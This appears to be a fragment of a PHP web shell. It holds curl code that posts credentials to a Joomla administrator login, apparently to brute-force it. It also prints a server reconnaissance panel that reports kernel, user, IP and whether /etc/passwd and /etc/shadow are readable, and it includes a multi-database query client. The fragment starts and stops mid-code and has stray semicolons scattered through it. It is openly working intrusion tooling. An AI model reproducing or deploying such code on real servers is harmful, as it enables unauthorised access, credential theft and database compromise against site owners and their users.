
ini_get('safe_mode');
curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php"); 


curl_setopt($curl,CURLOPT_POSTFIELDS,'username='.$user.'&passwd='.$pass.'&lang=en-GB&option=com_login&task=login&'.$token.'=1'); 
<table align='center' width='50%'><td><font 
color='#007700'>Kernel Version</font></td><td>";echo 
php_uname(); echo "<tr><td><font color='#007700'>Web 
Server</font></td><td>";echo $_SERVER["SERVER_SOFTWARE"]; 
echo "<tr><td><font color='#007700'>PHP 
Version</font></td><td>";echo phpversion(); echo " on "; 
echo php_sapi_name(); echo "<tr><td><font 
color='#007700'>Current User</font></td><td>";echo 
get_current_user(); echo "<tr><td><font 
color='#007700'>User ID</font></td><td>";echo getmyuid(); 
echo "<tr><td><font 
color='#007700'>Group</font></td><td>";echo getmygid(); 
echo "<tr><td><font color='#007700'>Cwd 
</font></td><td>";echo getcwd(); echo "<tr><td><font 
color='#007700'>Admin Server</font></td><td>";echo 
$_SERVER['SERVER_ADMIN']; echo "<tr><td><font 
color='#007700'>Server Port</font></td><td>";echo 
$_SERVER['SERVER_PORT']; echo "<tr><td><font 
color='#007700'>Server IP</font></td><td>";echo $serverIP = 
gethostbyname($_SERVER["HTTP_HOST"]); echo "<tr><td><font 
color='#007700'>Client IP</font></td><td>";echo 
$_SERVER['REMOTE_ADDR']; echo "<tr><td><font 
color='#007700'>cURL support</font></td><td>";echo 
function_exists('curl_version')?'Enabled':'No'; echo 
"<tr><td><font color='#007700'>Readable 
/etc/passwd</font></td><td>";echo 
@is_readable('/etc/passwd')?"Readable <a 
href='?action=moco'> [View]</a>":"Not Readable"; echo 
"<tr><td><font color='#007700'>Readable 
/etc/shadow</font></td><td>";echo 
@is_readable('/etc/shadow')?"Readable":"Not Readable"; 
$base = (ini_get("open_basedir") or 
strtoupper(ini_get("open_basedir"))=="ON")?"ON <font 
color='#007700'>secure</font>":"OFF <font 
color='#007700'>not secure</font>"; echo "<tr><td><font 
color='#007700'>Open Base Dir</font></td><td><font 
class=txt>" . $base . "</font>"; echo 
"</table></div></center><br>";


function in($type,$name,$size,$value,$checked=0) { $ret = 
 "<input type=".$type." name=".$name." "; if($size != 0) { 
 $ret .= "size=".$size." "; } $ret .= 
 "value=\"".$value."\""; if($checked) $ret .= " checked"; 
 return $ret.">"; }
 
class my_sql { var $host = 'localhost'; var $port = ''; var 
 $user = ''; var $pass = ''; var $base = ''; var $db = ''; 
 var $connection; var $res; var $error; var $rows; var 
 $columns; var $num_rows; var $num_fields; var $dump; 
 function connect() { switch($this->db) { case 'MySQL': 
 if(empty($this->port)) { $this->port = '3306'; } 
 if(!function_exists('mysql_connect')) return 0; 
 $this->connection = 
 @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass); 
 if(is_resource($this->connection)) return 1; $this->error 
 = @mysql_errno()." : ".@mysql_error(); break; case 
 'MSSQL': if(empty($this->port)) { $this->port = '1433'; } 
 if(!function_exists('mssql_connect')) return 0; 
 $this->connection = 
 @mssql_connect($this->host.','.$this->port,$this->user,$this->pass); 
 if($this->connection) return 1; $this->error = "Can't 
 connect to server"; break; case 'PostgreSQL': 
 if(empty($this->port)) { $this->port = '5432'; } $str = 
 "host='".$this->host."' port='".$this->port."' 
 user='".$this->user."' password='".$this->pass."' 
 dbname='".$this->base."'"; 
 if(!function_exists('pg_connect')) return 0; 
 $this->connection = @pg_connect($str); 
 if(is_resource($this->connection)) return 1; $this->error 
 = @pg_last_error($this->connection); break; case 'Oracle': 
 if(!function_exists('ocilogon')) return 0; 
 $this->connection = @ocilogon($this->user, $this->pass, 
 $this->base); if(is_resource($this->connection)) return 1; 
 $error = @ocierror(); $this->error=$error['message']; 
 break; } return 0; } function select_db() { 
 switch($this->db) { case 'MySQL': 
 if(@mysql_select_db($this->base,$this->connection)) return 
 1; $this->error = @mysql_errno()." : ".@mysql_error(); 
 break; case 'MSSQL': 
 if(@mssql_select_db($this->base,$this->connection)) return 
 1; $this->error = "Can't select database"; break; case 
 'PostgreSQL': return 1; break; case 'Oracle': return 1; 
 break; } return 0; } function query($query) { 
 $this->res=$this->error=''; switch($this->db) { case 
 'MySQL': 
 if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection))) 
 { $this->error = @mysql_error($this->connection); return 
 0; } else if(is_resource($this->res)) { return 1; } return 
 2; break; case 'MSSQL': 
 if(false===($this->res=@mssql_query($query,$this->connection))) 
 { $this->error = 'Query error'; return 0; } else 
 if(@mssql_num_rows($this->res) > 0) { return 1; } return 
 2; break; case 'PostgreSQL': 
 if(false===($this->res=@pg_query($this->connection,$query))) 
 { $this->error = @pg_last_error($this->connection); return 
 0; } else if(@pg_num_rows($this->res) > 0) { return 1; } 
 return 2; break; case 'Oracle': 
 if(false===($this->res=@ociparse($this->connection,$query))) 
 { $this->error = 'Query parse error'; } else { 
 if(@ociexecute($this->res)) { if(@ocirowcount($this->res) 
 != 0) return 2; return 1; }
 $error = @ocierror(); $this->error=$error['message']; } 
 break; } return 0; } function get_result() { 
 $this->rows=array(); $this->columns=array(); 
 $this->num_rows=$this->num_fields=0; switch($this->db) { 
 case 'MySQL': $this->num_rows=@mysql_num_rows($this->res); 
 $this->num_fields=@mysql_num_fields($this->res); 
 while(false !== ($this->rows[] = 
 @mysql_fetch_assoc($this->res))); 
 @mysql_free_result($this->res); if($this->num_rows) {
$this->columns = @array_keys($this->rows[0]); return 1;} 
 break; case 'MSSQL': 
 $this->num_rows=@mssql_num_rows($this->res); 
 $this->num_fields=@mssql_num_fields($this->res); 
 while(false !== ($this->rows[] = 
 @mssql_fetch_assoc($this->res))); 
 @mssql_free_result($this->res); if($this->num_rows) {
$this->columns = @array_keys($this->rows[0]); return 1;}
; break; case 'PostgreSQL': 
; $this->num_rows=@pg_num_rows($this->res); 
; $this->num_fields=@pg_num_fields($this->res); while(false 
; !== ($this->rows[] = @pg_fetch_assoc($this->res))); 
; @pg_free_result($this->res); if($this->num_rows)
 { $this->columns = @array_keys($this->rows[0]); return 1;} 
 break; case 'Oracle': 
 $this->num_fields=@ocinumcols($this->res); while(false !== 
 ($this->rows[] = @oci_fetch_assoc($this->res))) 
 $this->num_rows++; @ocifreestatement($this->res); 
 if($this->num_rows) {
$this->columns = @array_keys($this->rows[0]); return 1;} 
 break; } return 0; }
 function